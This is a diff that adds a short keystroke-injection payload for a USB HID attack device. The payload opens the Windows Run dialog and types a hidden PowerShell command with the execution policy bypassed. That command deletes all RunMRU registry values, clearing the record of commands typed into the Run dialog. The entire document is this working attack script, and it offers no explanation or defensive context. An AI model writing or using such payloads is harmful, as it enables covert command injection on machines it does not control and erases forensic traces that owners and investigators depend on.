@@ -1,0 +1,6 @@
+ATTACKMODE HID
+KEYDELAY 1
+DELAY 1000
+GUI r
+DELAY 500
+STRINGLN powershell -NoP -NonI -W Hidden -Exec Bypass "rp -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue;"
